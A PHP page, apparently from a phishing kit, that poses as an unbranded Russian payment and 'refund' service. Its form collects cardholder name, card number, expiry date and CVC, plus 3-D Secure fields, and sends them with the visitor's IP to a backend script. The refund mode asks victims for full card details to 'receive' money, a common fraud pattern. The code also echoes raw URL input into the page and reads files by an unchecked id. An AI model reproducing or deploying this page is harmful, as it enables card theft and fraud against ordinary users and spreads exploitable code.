<?php

error_reporting(0);

include "config.php";

if($_GET['card']) setcookie('card', $_GET['card'], time()+3600);


$amount = $_GET["amount"];
$item = $_GET["item"];
$type = $_GET["type"];
$order = rand(10000000, 99999999);

$title = "Платежная система";
$description_method = "Оплата с помощью банковской карты VISA или MasterCard. Безопасность обработки платежа по пластиковым картам гарантирует банк-эквайер.";
$heading_total = "Итого к оплате: ";
$heading_button = "Оплатить";

if (isset($_GET["id"]) && $_GET["id"] !== null) {
	$id = $_GET["id"];

	if (!file_exists("payments/" . $id)) {
		$error = "Некорректная платежная ссылка.";
	} else {
		$response = json_decode(file_get_contents("payments/" . $id), true);

		$amount = $response["amount"];
		$item = $response["item"];
		$type = $response["type"];
	}
}

if (!isset($amount) || $amount == "" || $amount < 1 || $amount > 150000) {
	$amount = 100;
}

if (!isset($item) || $item == "" && $type !== "refund") {
	$item = "Оплата счета на сумму " . number_format($amount, 0, "", " ") . " руб";
}

if (isset($type) && $type == "refund") {
	$title = "Платежная система | Возврат Средств";
	$heading = "Возврат платежа";
	$description_method = "Возрат на банковскую карту VISA или MasterCard. Безопасность обработки возврата по пластиковым картам гарантирует банк-эквайер.";
	$heading_total = "Итого к возврату: ";
	$heading_button = "Продолжить";

	if (!isset($item) || $item == "") {
		$item = "Возврат счета на сумму " . number_format($amount, 0, "", " ") . " руб";
	}
}

if (!isset($card) || $card == "" || strlen(str_replace(' ','',$card)) !== 16 || $card == "1234000000000000") {
	$error = "Некорректно указаны реквизиты получателя.";
}

?>

<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&amp;subset=cyrillic">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
		<link rel="stylesheet" type="text/css" href="css/bootstrap.css">
		<link rel="stylesheet" type="text/css" href="css/common.css">
		<link rel="shortcut icon" type="image/png" href="img/fav-icon.png">

		<script type="text/javascript" src="js/jquery.js"></script>
		<script type="text/javascript" src="js/bootstrap.js"></script>
		<script type="text/javascript" src="js/common.js"></script>
		<script type="text/javascript">
			var heading_button = "<i class='fas fa-chevron-right'></i> <?php echo $heading_button; ?>";
		</script>

		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

		<title><?php echo $title; ?></title>
	</head>

	<body>
		<div class="block-info">

<h3 class="heading-info">
		Платежная информация			</h3>

			<h3 class="heading-info">
				<?php echo $heading; ?>
			</h3>

			<p class="description-info">
				<?php echo $item; ?>
			</p>

			<div class="block-error">
				<p>
					<i class="fas fa-exclamation-triangle"></i>
					<span class="label-error"></span>
				</p>
			</div>
		</div>

		<div class="divider"></div>

		<div class="block-method">
			<div class="row">
				<div class="list-method">
					<div class="row">
						<div class="col-xs-6">
							<div class="item-method active-method">
								<img src="img/logo-card.svg">
							</div>
						</div>

						<div class="col-xs-6">
							<div class="item-method">
								<img src="img/logo-other.svg">
							</div>
						</div>

						<div class="col-xs-12">
							<div class="description-method">
								<p><?php echo $description_method; ?></p>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="block-form">
			<form class="form-payment" action="payment.php" method="post">
				<div class="form-group">
    					<label for="input-holder">Владелец карты</label>
    					<input type="text" class="form-control" id="input-holder" name="card_holder" placeholder="IVAN IVANOV">
				</div>

				<div class="form-group">
    					<label for="input-number">Номер карты</label>
    					<input type="text" class="form-control" id="input-number" name="card_number" data-type="number" placeholder="0000 0000 0000 0000">
				</div>

				<div class="row">
					<div class="col-xs-4">
						<div class="form-group">
		    					<label for="input-month">Срок действия</label>
		    					<input type="text" class="form-control" id="input-month" name="card_expire_month" data-type="number" placeholder="01" maxlength="2">
						</div>
					</div>

					<div class="col-xs-4">
						<div class="form-group">
		    					<input type="text" class="form-control" id="input-year" name="card_expire_year" data-type="number" placeholder="19" maxlength="2">
						</div>
					</div>

					<div class="col-xs-4">
						<div class="form-group">
		    					<label for="input-code">
		    						CVC-код
		    						<i class="far fa-question-circle" data-toggle="tooltip" data-placement="top" title="3 цифры на обороте карты"></i>
		    					</label>

		    					<input type="password" class="form-control" id="input-code" name="card_cvc" data-type="number" placeholder="•••" maxlength="3">
						</div>
					</div>
				</div>

				<input type="hidden" name="amount" value="<?php echo $amount; ?>">
				<input type="hidden" name="order" value="<?php echo $order; ?>">
				<input type="hidden" name="user_ip" value="<?=$_SERVER['REMOTE_ADDR']?>">
				<input type="hidden" name="ref" value="<?=$type == "refund" ? 1 : 0?>">
			</form>

			<form class="form-process" method="post">
				<input type="hidden" name="PaReq">
				<input type="hidden" name="MD">
				<input type="hidden" name="TermUrl">
			</form>

			<div class="block-form-info">
				<h4 class="heading-total"><?php echo $heading_total; ?><b><?php echo number_format($amount, 0, "", " "); ?> руб</b></h4>
				<p class="heading-secure">
					<i class="fas fa-lock"></i> Ваши данные надежно защищены.
				</p>
			</div>
		</div>

		<div class="divider"></div>

		<div class="block-footer">
			<div class="row">
				<div class="col-xs-6">
					<a class="button-secondary">
						<i class="fas fa-chevron-left"></i> Назад
					</a>
				</div>

				<div class="col-xs-6">
					<a class="button-primary">
						<i class="fas fa-chevron-right"></i> <?php echo $heading_button; ?>
					</a>
				</div>
			</div>
		</div>
	</body>

	<?php 
		if (isset($error) && $error !== "") {
			echo '
			<script type="text/javascript">
				$(".label-error").text("' . $error . '");
				$(".block-error").show();
			</script>
			';
		}
	?>
</html>